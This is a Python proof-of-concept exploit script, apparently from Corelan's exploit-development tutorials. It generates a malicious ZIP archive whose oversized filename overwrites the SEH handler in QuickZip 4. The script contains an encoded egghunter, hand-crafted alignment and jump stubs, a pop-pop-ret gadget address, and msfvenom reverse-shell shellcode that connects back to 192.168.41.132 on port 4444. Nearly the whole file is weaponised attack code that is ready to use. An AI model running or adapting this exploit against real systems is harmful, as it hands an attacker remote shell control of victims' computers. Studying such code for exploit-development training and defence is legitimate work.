#!/usr/bin/env python

# Original Author : corelanc0d3r
# Python POC Author: d3c3pt10n
# http://www.corelan.be:8800
#
# Original: March 2010
# Updated: October 2018

from struct import pack
from os import remove
from sys import exit


filename = "corelanboom.zip"
target_len = 4068
nseh_offset = 294
seh_offset = 298

ldf_header = (
    "\x50\x4B\x03\x04\x14\x00\x00"
    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00"
)

cdf_header = (
    "\x50\x4B\x01\x02\x14\x00\x14"
    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xe4\x0f"  # file size
    "\x00\x00\x00\x00\x00\x00\x01\x00"
    "\x24\x00\x00\x00\x00\x00\x00\x00"
)

eofcdf_header = (
    "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
    "\x12\x10\x00\x00"  # Size of central directory (bytes)
    "\x02\x10\x00\x00"  # Offset of start of central directory,
    # relative to start of archive
    "\x00\x00"
)

# msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed
# BufferRegister=EDX -a x86 --platform Windows
# Payload size: 117 bytes
encoded_egghunter = (
    "JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI2FmQIZYoFoPB0Rpj321HhMfNUl4ERz"
    "bTzOOHPwp0FPCDLK8zlo3ExjloBUIwYom7AA"
)
egghunter_len = len(encoded_egghunter)  # should be 117!
if egghunter_len != 117:
    print(
        "[!] Egghunter length was {current_len}, expected 117 bytes".format(
            current_len=len(encoded_egghunter)
        )
    )
    exit(1)

# 27 bvtes
shellcode_to_edx = (
  "\x25\x4a\x4d\x4e\x55"  # AND EAX,0x554E4D4A
  "\x25\x35\x32\x31\x2a"  # AND EAX,0x2A313235
  "\x2d\x5a\x56\x4e\x55"  # SUB EAX,0x554e565a
  "\x2d\x5a\x56\x4e\x55"  # SUB EAX,0x554e565a
  "\x2d\x5c\x58\x50\x55"  # SUB EAX,0x5550585c
  "\x50"  # PUSH EAX
  "\x5a"  # POP EDX
)
shellcode_to_edx_len = len(shellcode_to_edx)

# 19 bytes
decode_stack_alignment = (
    "\x54"  # PUSH ESP
    "\x58"  # POP EAX
    "\x2d\x42\x53\x55\x55"  # SUB EAX, 0x55555342
    "\x2d\x42\x53\x55\x55"  # SUB EAX, 0x55555342
    "\x2d\x44\x53\x55\x55"  # SUB EAX, 0x55555344
    "\x50"  # PUSH EAX
    "\x5c"  # POP ESP
)
decode_stack_alignment_len = len(decode_stack_alignment)

# 26 bytes
encoded_jmp_edx = (
  "\x25\x4a\x4d\x4e\x55"  # AND EAX,0x554E4D4A
  "\x25\x35\x32\x31\x2a"  # AND EAX,0x2A313235
  "\x2d\x25\x25\x55\x5e"  # SUB EAX,0x5e552525
  "\x2d\x25\x25\x55\x5e"  # SUB EAX,0x5e552525
  "\x2d\x26\x25\x56\x60"  # SUB EAX,0x60562526
  "\x50"  # PUSH EAX
)
encoded_jmp_edx_len = len(encoded_jmp_edx)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.41.132 LPORT=4444
# -e x86/alpha_mixed -a x86 --platform windows -f py -v revshell
# x86/alpha_mixed chosen with final size 710
# Payload size: 710 bytes
revshell = "w00tw00t"
revshell += "\x89\xe6\xdb\xdd\xd9\x76\xf4\x5e\x56\x59\x49\x49"
revshell += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
revshell += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
revshell += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
revshell += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
revshell += "\x39\x6c\x69\x78\x4b\x32\x73\x30\x37\x70\x47\x70"
revshell += "\x51\x70\x6d\x59\x6b\x55\x46\x51\x39\x50\x73\x54"
revshell += "\x4c\x4b\x36\x30\x30\x30\x4c\x4b\x61\x42\x46\x6c"
revshell += "\x6e\x6b\x51\x42\x72\x34\x6c\x4b\x61\x62\x46\x48"
revshell += "\x64\x4f\x4f\x47\x50\x4a\x74\x66\x76\x51\x39\x6f"
revshell += "\x4c\x6c\x35\x6c\x31\x71\x43\x4c\x64\x42\x44\x6c"
revshell += "\x61\x30\x5a\x61\x5a\x6f\x36\x6d\x77\x71\x49\x57"
revshell += "\x59\x72\x6c\x32\x33\x62\x30\x57\x4c\x4b\x71\x42"
revshell += "\x72\x30\x6e\x6b\x31\x5a\x75\x6c\x4e\x6b\x52\x6c"
revshell += "\x77\x61\x53\x48\x79\x73\x53\x78\x77\x71\x78\x51"
revshell += "\x53\x61\x6c\x4b\x30\x59\x35\x70\x73\x31\x6e\x33"
revshell += "\x6e\x6b\x62\x69\x62\x38\x59\x73\x47\x4a\x61\x59"
revshell += "\x6c\x4b\x56\x54\x6c\x4b\x65\x51\x7a\x76\x66\x51"
revshell += "\x4b\x4f\x4e\x4c\x79\x51\x58\x4f\x56\x6d\x76\x61"
revshell += "\x68\x47\x30\x38\x4d\x30\x53\x45\x4c\x36\x64\x43"
revshell += "\x63\x4d\x68\x78\x65\x6b\x61\x6d\x37\x54\x52\x55"
revshell += "\x6a\x44\x73\x68\x4e\x6b\x66\x38\x55\x74\x77\x71"
revshell += "\x6a\x73\x32\x46\x4c\x4b\x56\x6c\x72\x6b\x4c\x4b"
revshell += "\x76\x38\x67\x6c\x36\x61\x79\x43\x4c\x4b\x73\x34"
revshell += "\x6c\x4b\x55\x51\x4e\x30\x6b\x39\x52\x64\x56\x44"
revshell += "\x75\x74\x53\x6b\x61\x4b\x53\x51\x62\x79\x72\x7a"
revshell += "\x62\x71\x59\x6f\x6d\x30\x61\x4f\x71\x4f\x62\x7a"
revshell += "\x6c\x4b\x36\x72\x48\x6b\x4c\x4d\x73\x6d\x70\x68"
revshell += "\x74\x73\x54\x72\x43\x30\x55\x50\x30\x68\x54\x37"
revshell += "\x53\x43\x47\x42\x33\x6f\x46\x34\x42\x48\x50\x4c"
revshell += "\x33\x47\x71\x36\x74\x47\x6b\x4f\x7a\x75\x6f\x48"
revshell += "\x4e\x70\x57\x71\x75\x50\x67\x70\x37\x59\x59\x54"
revshell += "\x33\x64\x46\x30\x31\x78\x75\x79\x4b\x30\x62\x4b"
revshell += "\x37\x70\x69\x6f\x6a\x75\x62\x70\x76\x30\x50\x50"
revshell += "\x52\x70\x51\x50\x46\x30\x53\x70\x66\x30\x30\x68"
revshell += "\x48\x6a\x36\x6f\x39\x4f\x49\x70\x6b\x4f\x4b\x65"
revshell += "\x6e\x77\x61\x7a\x63\x35\x53\x58\x49\x50\x49\x38"
revshell += "\x77\x59\x4c\x44\x65\x38\x36\x62\x77\x70\x77\x61"
revshell += "\x71\x4c\x4c\x49\x5a\x46\x52\x4a\x46\x70\x70\x56"
revshell += "\x43\x67\x53\x58\x5a\x39\x4e\x45\x32\x54\x63\x51"
revshell += "\x49\x6f\x49\x45\x6f\x75\x6b\x70\x54\x34\x54\x4c"
revshell += "\x69\x6f\x32\x6e\x56\x68\x30\x75\x48\x6c\x72\x48"
revshell += "\x4c\x30\x6e\x55\x79\x32\x63\x66\x59\x6f\x78\x55"
revshell += "\x65\x38\x73\x53\x72\x4d\x31\x74\x55\x50\x4e\x69"
revshell += "\x59\x73\x73\x67\x46\x37\x56\x37\x35\x61\x69\x66"
revshell += "\x62\x4a\x66\x72\x73\x69\x30\x56\x68\x62\x49\x6d"
revshell += "\x43\x56\x4f\x37\x67\x34\x45\x74\x65\x6c\x53\x31"
revshell += "\x53\x31\x4c\x4d\x63\x74\x56\x44\x56\x70\x59\x56"
revshell += "\x35\x50\x62\x64\x62\x74\x46\x30\x56\x36\x53\x66"
revshell += "\x32\x76\x63\x76\x52\x76\x50\x4e\x76\x36\x32\x76"
revshell += "\x36\x33\x72\x76\x63\x58\x54\x39\x4a\x6c\x35\x6f"
revshell += "\x6d\x56\x59\x6f\x49\x45\x6f\x79\x39\x70\x30\x4e"
revshell += "\x76\x36\x63\x76\x59\x6f\x70\x30\x62\x48\x37\x78"
revshell += "\x4e\x67\x65\x4d\x35\x30\x69\x6f\x39\x45\x4d\x6b"
revshell += "\x5a\x50\x48\x35\x79\x32\x33\x66\x31\x78\x59\x36"
revshell += "\x4e\x75\x4d\x6d\x6d\x4d\x79\x6f\x6b\x65\x75\x6c"
revshell += "\x45\x56\x73\x4c\x76\x6a\x6d\x50\x4b\x4b\x4d\x30"
revshell += "\x70\x75\x53\x35\x6f\x4b\x62\x67\x34\x53\x52\x52"
revshell += "\x52\x4f\x61\x7a\x47\x70\x43\x63\x4b\x4f\x79\x45"
revshell += "\x41\x41"
 

# 9F gets mangled into 83 giving us a -125 byte jump
nseh = "\x71\x9F\x70\x9F"
# Message=  0x00435133 : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii,
# alphanum,uppernum {PAGE_EXECUTE_READ} [QuickZip.exe] ASLR: False, Rebase: False,
# SafeSEH: False, OS: False, v-1.0- (C:\Program Files\QuickZip4\QuickZip.exe)
seh = pack("<L", 0x00435133)
file_extension = ".txt"

payload = "A" * 26
payload += encoded_egghunter
payload += "A" * 28
payload += "B" * 4
payload += shellcode_to_edx
payload += decode_stack_alignment
payload += encoded_jmp_edx
payload += "C" * (
        119 - shellcode_to_edx_len - decode_stack_alignment_len - encoded_jmp_edx_len)
if len(payload) != nseh_offset:
    print(
        "[!] nSEH offset is {cur_offset}, expected {exp_offset}".format(
            cur_offset=len(payload), exp_offset=nseh_offset
        )
    )
    exit(1)
payload += nseh
if len(payload) != seh_offset:
    print(
        "[!] SEH offset is {cur_offset}, expected {exp_offset}".format(
            cur_offset=len(payload), exp_offset=seh_offset
        )
    )
    exit(1)
payload += seh
payload += "D" * 5
payload += revshell
payload += "D" * (target_len - len(payload) - len(file_extension))
payload += file_extension
payload_len = len(payload)

if payload_len != 4068:
    print(
        "[!] Filename payload is length {payload_len}, expected {target_len}".format(
            payload_len=payload_len, target_len=target_len
        )
    )
    exit(1)

print("[*] Size : {length} bytes".format(length=payload_len))
print("[*] Removing old {filename} file".format(filename=filename))
try:
    remove(filename)
except OSError:
    print("[!] Couldn't remove, probably doesn't exist. Ignoring this error")
    pass
print("[*] Creating new {filename} file".format(filename=filename))
with open(filename, "w") as f:
    file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
    f.write(file_content)
